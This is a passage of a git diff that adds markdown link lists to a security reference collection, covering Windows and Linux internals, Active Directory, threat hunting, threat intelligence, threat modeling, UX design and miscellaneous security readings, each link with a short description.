+* [About Processes and Threads](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917%28v=vs.85%29.aspx)
+* [PE File Format Graphs](http://blog.dkbza.org/2012/08/pe-file-format-graphs.html?view=mosaic)
+* [Peering Inside the PE: A Tour of the Win32 Portable Executable File Format](https://msdn.microsoft.com/en-us/library/ms809762.aspx?utm_content=buffer4588c&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer)
+* [TechNet Library: About Processes and Threads](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917%28v=vs.85%29.aspx)
+* [A Crash Course on the Depths of Win32™ Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
+* [What is a DLL?](https://support.microsoft.com/en-us/help/815065/what-is-a-dll)
+
+  * This article describes what a dynamic link library (DLL) is and the various
+    issues that may occur when you use DLLs. Then, this article describes some
+    advanced issues that you should consider when you develop your own DLLs. In
+    describing what a DLL is, this article describes dynamic linking methods,
+    DLL dependencies, DLL entry points, exporting DLL functions, and DLL
+    troubleshooting tools.
+
+* [Run-Time Dynamic Linking](https://msdn.microsoft.com/en-us/library/ms685090.aspx)
+* [Thread Local Storage](https://msdn.microsoft.com/en-us/library/ms686749.aspx)
+* [Windows 8 BOot](http://technet.microsoft.com/en-US/windows/dn168167.aspx)
+* [PEB32 and PEB64 in one definition](http://blog.rewolf.pl/blog/?p=294)
+* [Evolution of Process Environment Block (PEB)](http://blog.rewolf.pl/blog/?p=573)
+* [VirtualAlloc function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx>)
+* [Processes, Threads, and Jobs in the Windows Operating System](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2)
+
+#### Registry
+
+* [What registry entries are needed to register a COM object.](https://blogs.msdn.microsoft.com/larryosterman/2006/01/11/what-registry-entries-are-needed-to-register-a-com-object/)
+
+#### Symbol Files
+
+* [Process Security and Access Rights - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx)
+* [OpenProcessToken function - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379295%28v=vs.85%29.aspx)
+* [Symbols and Symbol Files - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/symbols-and-symbol-files)
+* [Symbol Files - docs ms](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa363368(v=vs.85).aspx>)
+* [microsoft-pdb](https://github.com/Microsoft/microsoft-pdb)
+
+  * This repo contains information from Microsoft about the PDB (Program
+    Database) Symbol File format.
+
+* [Public and Private Symbols - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/public-and-private-symbols)
+* [How to Inspect the Content of a Program Database (PDB) File](https://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P)
+* [microsoft-pdb](https://github.com/Microsoft/microsoft-pdb)
+
+  * This repo contains information from Microsoft about the PDB (Program
+    Database) Symbol File format.
+
+* [Symbol Files](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa363368(v=vs.85).aspx>)
+
+  * Normally, debugging information is stored in a symbol file separate from the
+    executable. The implementation of this debugging information has changed
+    over the years, and the following documentation will provide guidance
+    regarding these various implementations .
+
+#### Syscalls
+
+* [windows-syscall-table](https://github.com/tinysec/windows-syscall-table)
+
+  * windows syscall table from xp ~ 10 rs2
+
+* [Debugging Functions - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679303.aspx)
+* [Authenticode - MSDN](<https://msdn.microsoft.com/en-us/library/ms537359(v=vs.85).aspx>)
+
+  * Microsoft Authenticode, which is based on industry standards, allows
+    developers to include information about themselves and their code with their
+    programs through the use of digital signatures.
+
+##### System Features
+
+* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
+* [Application Compatibility in Windows](https://technet.microsoft.com/en-us/windows/jj863248)
+* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
+* [LSA Authentication](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326%28v=vs.85%29.aspx)
+
+  * LSA Authentication describes the parts of the Local Security Authority (LSA)
+    that applications can use to authenticate and log users on to the local
+    system. It also describes how to create and call authentication packages and
+    security packages.
+
+* [Hard Links and Junctions - msdn](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365006(v=vs.85).aspx>)
+* [Security Configuration Wizard](<https://technet.microsoft.com/en-us/library/cc754997(v=ws.11).aspx>)
+
+  * The Security Configuration Wizard (SCW) guides you through the process of
+    creating, editing, applying, or rolling back a security policy. A security
+    policy that you create with SCW is an .xml file that, when applied,
+    configures services, network security, specific registry values, and audit
+    policy. SCW is a role-based tool: you can use it to create a policy that
+    enables services, firewall rules, and settings that are required for a
+    selected server to perform specific roles, such as a file server, a print
+    server, or a domain controller.
+
+### Named Pipes
+
+* [Named Pipes](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590(v=vs.85).aspx>)
+* [CreateNamedPipe function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365150(v=vs.85).aspx>)
+* [CreateFile function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx>)
+* [ReadFile function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365467(v=vs.85).aspx>)
+* [WriteFile function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx>)
+* [How to create an anonymous pipe that gives access to everyone](https://support.microsoft.com/en-us/help/813414/how-to-create-an-anonymous-pipe-that-gives-access-to-everyone)
+
+### Windows Communication Foundation
+
+* [What Is Windows Communication Foundation](https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf)
+
+  * Windows Communication Foundation (WCF) is a framework for building
+    service-oriented applications. Using WCF, you can send data as asynchronous
+    messages from one service endpoint to another. A service endpoint can be
+    part of a continuously available service hosted by IIS, or it can be a
+    service hosted in an application. An endpoint can be a client of a service
+    that requests data from a service endpoint. The messages can be as simple as
+    a single character or word sent as XML, or as complex as a stream of binary
+    data.
+
+* [Fundamental Windows Communication Foundation Concepts](https://docs.microsoft.com/en-us/dotnet/framework/wcf/fundamental-concepts)
+
+  * WCF is a runtime and a set of APIs for creating systems that send messages
+    between services and clients. The same infrastructure and APIs are used to
+    create applications that communicate with other applications on the same
+    computer system or on a system that resides in another company and is
+    accessed over the Internet.
+
+* [Windows Communication Foundation Architecture Architecture Graphic](https://docs.microsoft.com/en-us/dotnet/framework/wcf/architecture)
+
+#### Writeups
+
+* AutoStart Locations
+
+  * [Collection of Windows Autostart locations](http://gladiator-antivirus.com/forum/index.php?showtopic=24610)
+  * [Windows Program Automatic Startup Locations](http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)
+
+* Exploit Prevention/Mitigation/Hardening
+
+  * [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
+  * [Windows 8 ASLR Explained](http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html)
+  * [Introduction to Windows Kernel Security](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html)
+  * [How Control Flow Guard Drastically Caused Windows 8.1 Address Space and Behavior Changes](http://www.alex-ionescu.com/?p=246)
+  * [Technical Overview of Windows UEFI Startup Process](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
+  * [Detecting stealthier cross-process injection techniques with Windows Defender ATP: Process hollowing and atom bombing](https://blogs.technet.microsoft.com/mmpc/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/)
+
+* File Structure
+
+  * [PEB Structure 32/64 pdf](http://blog.rewolf.pl/blog/wp-content/uploads/2013/03/PEB_Evolution.pdf)
+
+* General
+
+  * [Intercepting System Calls on x86_64 Windows](http://jbremer.org/intercepting-system-calls-on-x86_64-windows/)
+  * [Windows Filtering Platform: Persistent state under the hood](http://blog.quarkslab.com/windows-filtering-platform-persistent-state-under-the-hood.html)
+
+* Kernel
+
+  * [Inside the Windows Vista Kernel: Part 1](http://technet.microsoft.com/en-us/magazine/2007.02.vistakernel.aspx)
+
+* Processes
+
+  * [Know your Windows Processes or Die Trying](https://sysforensics.org/2014/01/know-your-windows-processes.html)
+
+    * Excellent quick reference on Windows proccesses with a focus on Win7. Good
+      resource.
+
+  * [Unkillable Processes](https://blogs.technet.microsoft.com/markrussinovich/2005/08/17/unkillable-processes/)
+
+* Sandboxing
+
+  * [Advanced Desktop Application Sandboxing via AppContainer](https://www.malwaretech.com/2015/09/advanced-desktop-application-sandboxing.html)
+  * [Usermode Sandboxing](http://www.malwaretech.com/2014/10/usermode-sandboxing.html)
+
+* Windows
+
+  * [Hyper-V internals](https://hvinternals.blogspot.fr/2015/10/hyper-v-internals.html)
+  * [Hyper-V debugging for beginner](https://hvinternals.blogspot.fr/2015/10/hyper-v-debugging-for-beginners.html)
+  * [Windows Operating System Archaeology](https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology)
+  * [Understanding Windows at a deeper level - Sessions, Window Stations, and Desktops](https://brianbondy.com/blog/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops)
+  * [Introduction to ADS: Alternate Data Streams](https://hshrzd.wordpress.com/2016/03/19/introduction-to-ads-alternate-data-streams/)
+  * [Creative and unusual things that can be done with the Windows API.](https://github.com/LazoCoder/Windows-Hacks)
+
+#### Presentations & Talks
+
+* [Windows 8 Security and ARM](http://2012.ruxconbreakpoint.com/assets/Uploads/bpx/alex-breakpoint2012.pdf)
+* [How Do Windows NT System Calls REALLY Work?](http://www.codeguru.com/cpp/w-p/system/devicedriverdevelopment/article.php/c8035/How-Do-Windows-NT-System-Calls-REALLY-Work.htm)
+* [WinPrefetchView v1.25](http://www.nirsoft.net/utils/win_prefetch_view.html)
+
+  * Each time that you run an application in your system, a Prefetch file which
+    contains information about the files loaded by the application is created by
+    Windows operating system. The information in the Prefetch file is used for
+    optimizing the loading time of the application in the next time that you run
+    it. WinPrefetchView is a small utility that reads the Prefetch files stored
+    in your system and display the information stored in them. By looking in
+    these files, you can learn which files every application is using, and which
+    files are loaded on Windows boot.
+
+* [Windows 8 Security and ARM](http://2012.ruxconbreakpoint.com/assets/Uploads/bpx/alex-breakpoint2012.pdf)
+* [License to Kill: Malware Hunting with the Sysinternals Tools](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
+* [Utilizing SysInternal Tools for IT Pros](http://www.microsoftvirtualacademy.com/training-courses/utilizing-sysinternals-tools-for-it-pros#fbid=1IKsqgyvnWp)
+
+### Active Directory
+
+* [Active Directory Architecture](https://technet.microsoft.com/en-us/library/bb727030.aspx)
+* [AD Local Domain groups, Global groups and Universal groups.](https://ss64.com/nt/syntax-groups.html)
+* [Active Directory Control Paths](https://github.com/ANSSI-FR/AD-control-paths)
+
+  * Active Directory Control Paths auditing and graphing tools
+
+#### Kerberos Related
+
+* [Kerberos Delegation, SPNs and More...](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more)
+* [Article Explaining what the KRBTGT account in AD is](http://windowsitpro.com/security/q-what-krbtgt-account-used-active-directory-ad-environment)
+
+### Linux General
+
+* [Introduction to Linux - Machtelt Garrels](http://www.tldp.org/LDP/intro-linux/html/intro-linux.html)
+
+  * Excellent doc covering every aspect of linux. Deserves at least 1 skim
+    through.
+
+* [Linux Documentation Project](http://www.tldp.org/)
+
+  * The Linux Documentation Project is working towards developing free, high
+    quality documentation for the Linux operating system. The overall goal of
+    the LDP is to collaborate in all of the issues of Linux documentation.
+
+* [Bash Guide for Beginners](http://www.tldp.org/LDP/Bash-Beginners-Guide/html/Bash-Beginners-Guide.html)
+* [pagexec - GRSEC](https://pax.grsecurity.net/docs/pageexec.txt)
+
+### Linux Internals
+
+* [linux-insides](https://www.gitbook.com/book/0xax/linux-insides/details)
+
+  * A series of posts about the linux kernel. The goal is simple - to share my
+    modest knowledge about the internals of the linux kernel and help people who
+    are interested in the linux kernel, and other low-level subject matter.
+
+* [Introduction to Linux - Machtelt Garrels](http://www.tldp.org/LDP/intro-linux/html/intro-linux.html)
+
+  * Excellent doc covering every aspect of linux. Deserves at least 1 skim
+    through.
+
+* [Linux Kernel Security Subsystem Wiki](https://kernsec.org/wiki/index.php/Main_Page)
+
+  * This is the Linux kernel security subsystem wiki, a resource for developers
+    and users.
+
+#### Compilers/Exploit Mitigations
+
+* [Linkers and Loaders - Book](http://www.iecc.com/linker/)
+
+  * These are the manuscript chapters for my Linkers and Loaders, published by
+    Morgan-Kaufman. See the book's web site for ordering information.
+  * All chapters are online for free at the above site.
+
+* [Linker and Libraries](http://docs.oracle.com/cd/E19457-01/801-6737/801-6737.pdf)
+
+#### Drivers
+
+* [Linux Device Drivers book](http://www.makelinux.net/ldd3/)
+
+#### FileSystems
+
+* Linux Filesystem infographic
+* [Part 1](http://i.imgur.com/EU6ga.jpg)
+* [Part 2](http://i.imgur.com/S5Ds2.jpg)
+
+#### Kernel
+
+* [Linux Kernel Explanation/Walk through](http://www.faqs.org/docs/Linux-HOWTO/KernelAnalysis-HOWTO.html)
+* [Kernel booting process](https://github.com/0xAX/linux-insides/tree/master/Booting)
+
+  * This chapter describes linux kernel booting process.
+
+* [How the Kernel manages Memory - Linux](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory/)
+
+#### Memory
+
+* [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
+* [Memory Management: Paging](https://www.cs.rutgers.edu/~pxk/416/notes/09a-paging.html)
+* [Anatomy of a program in memory](http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/)
+
+  * Writeup on the structure of program memory in Linux.
+
+* [Understanding !PTE - Non-PAE and X64](http://blogs.msdn.com/b/ntdebugging/archive/2010/06/22/part-3-understanding-pte-non-pae-and-x64.aspx?Redirected=true)
+* [Linux GLibC Stack Canary Values](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/)
+* [Stack Smashing Protector](http://wiki.osdev.org/Stack_Smashing_Protector)
+* [Memory Translation and Segmentation](http://duartes.org/gustavo/blog/post/memory-translation-and-segmentation/)
+
+#### Process Structure/Syscalls
+
+* [FlexSC: Flexible System Call Scheduling with Exception-Less System Calls](https://www.cs.cmu.edu/~chensm/Big_Data_reading_group/papers/flexsc-osdi10.pdf)
+* [List of Linux/i386 system calls](http://asm.sourceforge.net/syscall.html)
+* [Linux Syscall Table](http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)
+
+  * Complete listing of all Linux Syscalls
+
+#### ELF
+
+* [The 101 of ELF Binaries on Linux: Understanding and Analysis](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/)
+* [Understanding the ELF](https://medium.com/@MrJamesFisher/understanding-the-elf-4bd60daac571)
+* [ELF Format](http://www.skyfree.org/linux/references/ELF_Format.pdf)
+
+#### X
+
+* [X Window System Explained](https://magcius.github.io/xplain/article/index.html)
+* [Foreign LINUX](https://github.com/wishstudio/flinux)
+
+  * Foreign LINUX is a dynamic binary translator and a Linux system call
+    interface emulator for the Windows platform. It is capable of running
+    unmodified Linux binaries on Windows without any drivers or modifications to
+    the system. This provides another way of running Linux applications under
+    Windows in constrast to Cygwin and other tools.
+
+### ARM ARM References
+
+* [A Detailed Analysis of Contemporary ARM and x86 Architectures](http://research.cs.wisc.edu/vertical/papers/2013/isa-power-struggles-tr.pdf)
+
+  * RISC vs. CISC wars raged in the 1980s when chip area andprocessor design
+    complexity were the primary constraints anddesktops and servers exclusively
+    dominated the computing land-scape. Today, energy and power are the primary
+    design con-straints and the computing landscape is significantly
+    different:growth in tablets and smartphones running ARM (a RISC ISA)is
+    surpassing that of desktops and laptops running x86 (a CISCISA). Further,
+    the traditionally low-power ARM ISA is enter-ing the high-performance server
+    market, while the traditionallyhigh-performance x86 ISA is entering the
+    mobile low-power de-vice market. Thus, the question of whether ISA plays an
+    intrinsicrole in performance or energy efficiency is becoming important,and
+    we seek to answer this question through a detailed mea-surement based study
+    on real hardware running real applica-tions. We analyze measurements on the
+    ARM Cortex-A8 andCortex-A9 and Intel Atom and Sandybridge i7
+    microprocessorsover workloads spanning mobile, desktop, and server
+    comput-ing. Our methodical investigation demonstrates the role of ISAin
+    modern microprocessors’ performance and energy efficiency.We find that ARM
+    and x86 processors are simply engineeringdesign points optimized for
+    different levels of performance, andthere is nothing fundamentally more
+    energy efficient in one ISAclass or the other. The ISA being RISC or CISC
+    seems irrelevant.
+
+* [ARM Documentation](http://infocenter.arm.com/help/index.jsp?noscript=1)
+
+### OS X Internals
+
+* [Instruments - OS X system analysis](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html)
+
+  * Instruments is a performance-analysis and testing tool for dynamically
+    tracing and profiling OS X and iOS code. It is a flexible and powerful tool
+    that lets you track a process, collect data, and examine the collected data.
+    In this way, Instruments helps you understand the behavior of both user apps
+    and the operating system.
+
+### Other
+
+* [Intel SGX Explained](https://eprint.iacr.org/2016/086.pdf)
+
+  * This paper analyzes Intel SGX, based on the 3 pa- pers [ 14 , 78 , 137 ]
+    that introduced it, on the Intel Software Developer’s Manual [ 100 ] (which
+    supersedes the SGX manuals [ 94 , 98 ]), on an ISCA 2015 tutorial [ 102 ],
+    and on two patents [ 108 , 136 ]. We use the papers, reference manuals, and
+    tutorial as primary data sources, and only draw on the patents to fill in
+    missing information. This paper’s contributions are a summary of the
+    Intel-specific architectural and micro-architectural details needed to
+    understand SGX, a detailed and structured pre- sentation of the publicly
+    available information on SGX, a series of intelligent guesses about some
+    important but undocumented aspects of SGX, and an analysis of SGX’s security
+    properties.
diff --git a/source/Threat-Hunting.md b/source/Threat-Hunting.md
new file mode 100644
index 0000000..4149c64
--- /dev/null
+++ b/source/Threat-Hunting.md
@@ -0,0 +1,33 @@
+# Threat Hunting
+
+### ToC
+
+* Articles
+* Talks / Videos
+* Tools
+* Papers
+
+### Articles/Blogposts
+
+* [Windows Log Hunting with PowerShell](http://909research.com/windows-log-hunting-with-powershell/)
+
+* [Hunting in Memory](https://www.endgame.com/blog/technical-blog/hunting-memory)
+
+* [Cyber Security Workforce Framework](https://niccs.us-cert.gov/workforce-development/cyber-security-workforce-framework)
+
+* [Windows Log Hunting with PowerShell](http://909research.com/windows-log-hunting-with-powershell/)
+
+### Talks/Videos
+
+* [Taking Hunting to the Next Level Hunting in Memory - Jared Atkinson 2017](https://www.youtube.com/watch?v=3RUMShnJq_I)
+
+### Tools
+
+* [Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
+
+  * Revoke-Obfuscation is a PowerShell v3.0+ compatible PowerShell obfuscation
+    detection framework.
+
+### Papers
+
+[Revoke - Obfuscation: PowerShell Obfuscation Detection Using Science](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)
diff --git a/source/Threat-Intelligence.md b/source/Threat-Intelligence.md
new file mode 100644
index 0000000..5775221
--- /dev/null
+++ b/source/Threat-Intelligence.md
@@ -0,0 +1,40 @@
+# Threat Intelligence (or lack therof)
+
+* [No Budget Threat Intelligence - Tracking Malware Campaigns on the Cheap - ShmooCon15](https://www.youtube.com/watch?v=DKfWukYffsE&app=desktop)
+
+  * "In this talk, I'll be discussing my experience developing
+    intelligence-gathering capabilities to track several different independent
+    groups of threat actors on a very limited budget (read: virtually no budget
+    whatsoever). I'll discuss discovering the groups using open source
+    intelligence gathering and honeypots, monitoring attacks, collecting and
+    analyzing malware artifacts to figure out what their capabilities are, and
+    reverse engineering their malware to develop the capability to track their
+    targets in real time. Finally, I'll chat about defensive strategies and
+    provide recommendations for enterprise security analysts and other security
+    researchers. I'll also be releasing a suite of tools I created to help
+    threat researchers perform tracking and attribution.
+
+* [Malware Information Sharing Platform](https://github.com/MISP/MISP)
+
+  * MISP - Malware Information Sharing Platform & Threat Sharing
+
+* [Collective Intelligence Framework](http://csirtgadgets.org/collective-intelligence-framework/)
+
+  * "Our Flagship Project, is a cyber threat intelligence management system. CIF
+    allows you to combine known malicious threat information from many sources
+    and use that information for identification (incident response), detection
+    (IDS) and mitigation (null route). The most common types of threat
+    intelligence warehoused in CIF are IP addresses, domains and urls that are
+    observed to be related to malicious activity."
+
+* [Collaborative Research Into Threats](https://crits.github.io/)
+
+  * CRITs is an open source malware and threat repository that leverages other
+    open source software to create a unified tool for analysts and security
+    experts engaged in threat defense. It has been in development since 2010
+    with one goal in mind: give the security community a flexible and open
+    platform for analyzing and collaborating on threat data. In making CRITs
+    free and open source, we can provide organizations around the world with the
+    capability to quickly adapt to an ever-changing threat landscape. CRITs can
+    be installed locally for a private isolated instance or shared among other
+    trusted organizations as a collaborative defense mechanism.
diff --git a/source/Threat-Modeling.md b/source/Threat-Modeling.md
new file mode 100644
index 0000000..a92bea0
--- /dev/null
+++ b/source/Threat-Modeling.md
@@ -0,0 +1,63 @@
+# Threat Modeling
+
+### TOC
+
+* General
+* Talks & Presentations
+* Threat Modeling Methodologies
+* Writeups & Articles
+* Tools
+* Papers
+
+### General
+
+* [Global Adversarial Capability Modeling](https://www.youtube.com/watch?v=56T3JN09SrY#t=41)
+
+* [ThreatHuntingStuff](https://github.com/MatthewDemaske/ThreatHuntingStuff)
+
+* [Adam Shostack - Pentesting: Lessons from Star Wars](https://www.youtube.com/watch?v=BfWWryF8M7E&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=13)
+
+  * Everyone knows you ought to threat model, but in practical reality it turns
+    out to be tricky. If past efforts to threat model haven’t panned out,
+    perhaps part of the problem is confusion over what works, and how the
+    various approaches conflict or align. This talk captures lessons from years
+    of work helping people throughout the software industry threat model more
+    effectively. It’s designed to help security pros, especially pen testers,
+    all of whom will leave with both threat modeling lessons from Star Wars and
+    a proven foundation, enabling them to threat model effectively on offense or
+    defense.
+
+### Talks & Presenetations
+
+* [A Hacker's Guide to Risk](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-23-Bruce-Potter-Hackers-Guide-to-Risk.pdf)
+
+* [Global Adversarial Capability Modeling](https://www.youtube.com/watch?v=56T3JN09SrY#t=41)
+
+### Threat Modeling Methodologies
+
+* [Guerrilla Threat Modelling (or 'Threat Modeling' if you're American)](http://blogs.msdn.com/b/ptorr/archive/2005/02/22/guerillathreatmodelling.aspx)
+
+### Writeups/Articles
+
+* [Why your threat model is probably wrong - Cyberwar](http://blog.thinkst.com/p/cyberwar-why-your-threat-model-is.html)
+
+* [7 Steps to Threat Modeling](https://www.slideshare.net/chinwhei/7-steps-to-threat-modeling)
+
+### Tools
+
+* [seasponge - Mozilla Project](https://github.com/mozilla/seasponge)
+
+  * Accessible and client-side threat modeling tool
+  * [GIFs demonstrating usage](https://github.com/mozilla/seasponge/wiki/usage)
+
+* [On Comparing Threat Intelligence Feeds](http://blogs.gartner.com/anton-chuvakin/2014/01/07/on-comparing-threat-intelligence-feeds/)
+
+* [ThreadFix](https://github.com/denimgroup/threadfix)
+
+  * ThreadFix is a software vulnerability aggregation and management system that
+    helps organizations aggregate vulnerability data, generate virtual patches,
+    and interact with software defect tracking systems.
+
+### Papers
+
+* [Statement for the Record Worldwide Threat Assessment of the US Intelligence Community Senate Select Committee on Intelligence](https://www.dni.gov/files/documents/Newsroom/Testimonies/SSCI%20Unclassified%20SFR%20-%20Final.pdf)
diff --git a/source/UX-Design.md b/source/UX-Design.md
new file mode 100644
index 0000000..be5e444
--- /dev/null
+++ b/source/UX-Design.md
@@ -0,0 +1,57 @@
+# UX/UI Design - Because we all know how sexy PGP looks / How easy to use it is.
+
+#### ToC
+
+* [General](#general)
+* [Books](#books)
+* [Talks/Presentations](#talks)
+* [Websites/Organizations](#web)
+
+#### Sort
+
+* [The unexpected dangers of preg_replace()](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)
+* [Dribble](https://dribbble.com/)
+* [Uplabs](https://www.uplabs.com/)
+* [CodePen](https://codepen.io/)
+
+### General
+
+* Required Reading:
+  [The Design of Everyday Things](http://www.jnd.org/books/design-of-everyday-things-revised.html)
+
+  * This book is extraordinary not only in the fact that its a crash course on
+    UI/UX design but also for the fact that almost anyone can read it and
+    understand the principles it talks about.
+
+* [User Interface - Wikipedia](https://en.wikipedia.org/wiki/User_interface)
+* [User Interface Design - Wikipedia](https://en.wikipedia.org/wiki/User_interface_design)
+* [UI Patterns](http://ui-patterns.com/)
+* [Principals of User Interface Design](https://en.wikipedia.org/wiki/Principles_of_user_interface_design)
+* [User Interface Design Basics - usability.gov](https://www.usability.gov/what-and-why/user-interface-design.html)
+
+### Books
+
+* The Design of Everyday Things
+* Emotional Design
+* Don't Make me think
+
+### Talks & Presentations
+
+* [UI Fundamentals for Programmers by Ryan Singer](https://vimeo.com/6702766)
+
+### Articles
+
+* [The Complete Moral Bankruptcy of Manipulating Human Psychology To Turn Users Into Addicts](https://hackernoon.com/the-complete-moral-bankruptcy-of-manipulating-human-psychology-to-turn-users-into-addicts-d09b98281ef)
+
+### Websites/Organizations
+
+* [Dark Patterns: fighting user deception worldwide](http://darkpatterns.org/)
+
+  * A Dark Pattern is a user interface that has been carefully crafted to trick
+    users into doing things, such as buying insurance with their purchase or
+    signing up for recurring bills.
+
+* [Nielsen Norman Group](http://www.nngroup.com)
+
+  * Evidence-Based User Experience Research, Training, and Consulting
+  * Check articles and guidelines, ignore other sections
diff --git a/source/Useful-Stuff.md b/source/Useful-Stuff.md
new file mode 100644
index 0000000..23802ec
--- /dev/null
+++ b/source/Useful-Stuff.md
@@ -0,0 +1,1063 @@
+# Interesting Things & Useful Stuff
+
+### Table of Contents
+
+* [Attribution](#attribution)
+* [News/Reports](#news)
+* [General](#general)
+* [Tamper Evidence](#tamper)
+* [General Interesting things that aren't neccessarily infosec related](#notinfo)
+* [Interesting Talks & Videos](#talks)
+* [Interesting & Useful Attacks](#attacks)
+* [Interesting & Useful Papers](#papers)
+* [Interesting & Useful Hardware Projects](#hwprojects)
+* [Interesting & Useful Software](#software))
+* [Interesting & Useful Write-ups](#writeup)
+* [Simulators](#sim)
+* [Screen Scraping](#scrape)
+* [Various Purpose Based OS's](#purpose)
+
+#### To Sort
+
+* [Sort and break into policy/high level/ vs interesting things](http://spth.virii.lu/articles.htm)
+* [Virtualization Based Security - Part 2: kernel communications](http://blog.amossys.fr/virtualization-based-security-part2.html)
+* [Binary SMS - The old backdoor to your new thing](https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/)
+* [A Sysadmin's Unixersal Translator (ROSETTA STONE)](http://bhami.com/rosetta.html)
+* [Windows Firewall Control - Managing Windows Firewall is now easier than ever](https://www.binisoft.org/wfc.php)
+* [OSX for Hackers (Mavericks/Yosemite)](https://gist.github.com/matthewmueller/e22d9840f9ea2fee4716)
+* [What Colour are your bits?](http://ansuz.sooke.bc.ca/entry/23)
+
+### General Articles
+
+* This is why we can't have nice things ->
+  [VBScript Injection via GNOME Thumbnailer - On Linux](http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html)
+* [Hamming - You and your research](https://www.youtube.com/watch?v=a1zDuOPkMSw)
+* [Your Project from Idea to Reality](http://www.slideshare.net/maltman23/your-project-from-idea-to-reality)
+* [Windows Commands Abused by Attackers](http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html)
+* [The Distribution of Users’ Computer Skills: Worse Than You Think](https://www.nngroup.com/articles/computer-skill-levels/)
+* [Infosec Podcasts](http://www.getmon.com/)
+* [THE BASIC LAWS OF HUMAN STUPIDITY - Carlo M. Cipolia](http://harmful.cat-v.org/people/basic-laws-of-human-stupidity/)
+
+#### Airplanes
+
+* [NTSB Aviation Accident Database & Synopses](https://www.ntsb.gov/_layouts/ntsb.aviation/index.aspx)
+* [The Aviation Herald](https://avherald.com/)
+* [radar - securitywizardy](http://www.securitywizardry.com/radar.htm)
+* [Real-life experiences in avionics security assessment (A. Barisani)](https://www.youtube.com/watch?v=xtSmPgXw34I&feature=youtu.be&app=desktop)
+
+#### Attacking
+
+* [It’s all about the timing... Blackhat talk](https://www.blackhat.com/presentations/bh-usa-07/Meer_and_Slaviero/Whitepaper/bh-usa-07-meer_and_slaviero-WP.pdf)
+
+  * Description: This paper is broken up into several distinct parts, all
+    related loosely to timing and its role in information se- curity today.
+    While timing has long been recognized as an important component in the
+    crypt-analysts arse- nal, it has not featured very prominently in the domain
+    of Application Security Testing. This paper aims at highlighting some of the
+    areas in which timing can be used with great effect, where traditional
+    avenues fail. In this paper, a brief overview of previous timing attacks is
+    provided, the use of timing as a covert channel is examined and the
+    effectiveness of careful timing during traditional web application and SQL
+    injection attacks is demonstrated. The use of Cross Site Timing in bypass-
+    ing the Same Origin policy is explored as we believe the technique has
+    interesting possibilities for turning innocent browsers into bot-nets aimed
+    at, for instance, brute-force attacks against third party web-sites
+
+* [A Look In the Mirror: Attacks on Package Managers](https://isis.poly.edu/~jcappos/papers/cappos_mirror_ccs_08.pdf)
+* [VM as injection payload ](http://infiltratecon.com/downloads/python_deflowered.pdf)
+* [Thousands of MongoDB installations on the net unprotected](http://cispa.saarland/wp-content/uploads/2015/02/MongoDB_documentation.pdf)
+* [Exploiting the DRAM rowhammer bug to gain kernel privileges](http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
+
+  * "Rowhammer” is a problem with some recent DRAM devices in which repeatedly
+    accessing a row of memory can cause bit flips in adjacent rows. We tested a
+    selection of laptops and found that a subset of them exhibited the problem.
+    We built two working privilege escalation exploits that use this effect. One
